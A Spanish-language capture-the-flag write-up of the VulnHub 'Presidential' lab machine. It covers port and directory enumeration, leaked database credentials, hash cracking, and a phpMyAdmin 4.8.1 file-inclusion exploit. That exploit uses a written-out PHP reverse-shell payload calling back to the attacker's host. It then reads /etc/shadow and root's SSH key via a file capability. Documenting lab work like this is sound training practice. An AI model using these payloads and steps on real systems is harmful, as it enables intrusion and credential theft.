------
- Tags: #searchsploit #capabilities #john #cap_dac_read_search #ssh
-----
# Explicación e instalación

> En este cuarto escenario vamos a estar resolviendo la máquina **Presidential**, para descargarla nos vamos a dirigir al siguiente [link](https://www.vulnhub.com/entry/presidential-1,500/). En este caso tendremos que configurar el adaptador de red en modo **Bridged**.

-----
# Resolución

## Reconocimiento

### NMAP

```js
# Nmap 7.94SVN scan initiated Wed Oct 30 14:17:31 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN allPorts 192.168.0.190
Nmap scan report for 192.168.0.190
Host is up, received arp-response (0.0011s latency).
Scanned at 2024-10-30 14:17:31 -03 for 5s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  REASON
80/tcp   open  http     syn-ack ttl 64
2082/tcp open  infowave syn-ack ttl 64
MAC Address: 00:0C:29:8F:3B:C1 (VMware)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Oct 30 14:17:37 2024 -- 1 IP address (1 host up) scanned in 5.76 seconds
```

Servicios y versiones

```js
# Nmap 7.94SVN scan initiated Wed Oct 30 14:18:21 2024 as: nmap -sCV -p80,2082 -oN services 192.168.0.190
Nmap scan report for 192.168.0.190
Host is up (0.00030s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
|_http-title: Ontario Election Services &raquo; Vote Now!
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
MAC Address: 00:0C:29:8F:3B:C1 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 30 14:18:27 2024 -- 1 IP address (1 host up) scanned in 6.84 seconds
```

### Información obtenida y acceso

```js
-----------------------------------------------------
Puerto 80

whatweb: http://192.168.0.190 [200 OK] Apache[2.4.6], Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,contact@votenow.loca], HTML5, HTTPServer[CentOS][Apache/2.4.6
 (CentOS) PHP/5.5.38], IP[192.168.0.190], JQuery, PHP[5.5.38], Script, Title[Ontario Election Services &raquo; Vote Now!]

Virtual Hosting: votenow.local

Servicio Apache/2.4.6
PHP/5.5.38
contact@example.com
contact@votenow.local

Directory's (gobuster)
/cgi-bin/
/icons/
/assets/
# Se encontró realizando un escaneo exhaustivo con -x php,txt,html,php.bak,bak,tar,zip más directorios (HAY QUE PROBAR SIEMPRE CON --add-slash y SIN TAMBIÉN)
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.190/ -t 20 -x php,txt,html,php.bak,bak
/config.php
/config.php.bak

----------------------------------------------------
#### Credenciales en /config.php.bak ####

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

----------------------------------------------------

########## GANAMOS ACCESO A LA MÁQUINA

Sub-domains (gobuster y WFUZZ) (Se utilizó diccionario de top-1-million y también se utilizó el diccionario de directory-list-2.3-medium a pesar de que sea un diccionario de directorios)

datasafe.votenow.local/ PANEL DE LOGIN DE PHPMYADMIN (Lo incorporamos al /etc/hosts)

Utilizamos las credenciales del archivo /config.php.bak de votenow.local para ganar acceso al panel de Login de phpmyadmin

Una vez dentro, en la pestaña votebox y luego desplegando users, veremos al usuario admin con sus credenciales.

#### admin:$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
Crackeamos la contraseña con la herramienta john -w:/usr/share/wordlists/rockyou.txt
La contraseña crackeada es Stella

whatweb: datasafe.votenow.local = phpMyAdmin[4.8.1]
searchsploit phpMyAdmin 4.8.1 RCE: php/webapps/50457.py

Tomando la información del script del RCE nos dirigímos a la ruta --> /index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_(COOKIE ACTUAL ACÁ)
Dicha ruta nos mostrará una especie de "Log" de las querys tramitadas en mysql, por lo tanto si nos metemos en la pestaña SQL y colocamos un código PHP, será interpretado al volver al LOG, yo coloque una REVERSE SHELL --> select '<?php system("bash -i >& /dev/tcp/192.168.0.194/443 0>&1") ?>'

########## GANAMOS ACCESO A LA MÁQUINA

################################################

Escalada de privilegios:

Ganamos acceso a la máquina y nos logueamos como el usuario "admin" que previamente conseguimos su contraseña y la hemos crackeado.

Con getcap -r / 2>/dev/null encontramos una capabilitie llamada cap_dac_read_search+ep asignada en el binario /usr/bin/tarS que actua igual que la herramienta tar para comprimir y descomprimir archivos, por lo tanto lo que haremos será comprimir el contenido del /etc/shadow (Que no poseemos permiso de lectura) en el directorio /tmp/.

tar -cvf shadow.tar /etc/shadow
Despues lo descomprimimos con tar -xvf shadow.tar de esta forma podemos ver su contenido ya que nosotros somos los propietarios de dicho comprimido.

Verificamos que esto funciona, por lo tanto podríamos leer cualquier archivo del sistema, esto nos permite leer el archivo de la clave privada del usuario root, ubicado en /root/.ssh/id_rsa, de esta forma conseguiremos la clave que nos permitirá autenticarnos sin proporcionar contraseña a través del servicio SSH.

ssh -i id_rsa root@localhost -p 2082 ------> le pasamos el archivo llamado id_rsa que conseguimos con el comando tarS y ingresamos al usuario root a través del puerto 2082 SHH.
```

### Imágenes de utilidad

![[Imagenes de todas las carpetas/Máquina vulnerable 4/MV 1.png]]

![[Imagenes de todas las carpetas/Máquina vulnerable 4/MV 2.png]]

![[Imagenes de todas las carpetas/Máquina vulnerable 4/MV 3.png]]